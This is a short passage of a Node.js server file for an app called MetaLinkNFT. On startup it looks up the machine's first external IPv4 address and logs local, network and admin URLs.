app.listen(PORT, HOST, () => {
  const nets = os.networkInterfaces();
  let localIP = 'unknown';
  for (const iface of Object.values(nets)) {
    for (const addr of iface) {
      if (addr.family === 'IPv4' && !addr.internal) {
        localIP = addr.address;
        break;
      }
    }
    if (localIP !== 'unknown') break;
  }
  console.log(`MetaLinkNFT server running:`);
  console.log(`  Local:   http://localhost:${PORT}`);
  console.log(`  Network: http://${localIP}:${PORT}`);
  console.log(`  Admin:   http://localhost:${PORT}/admin`);
});
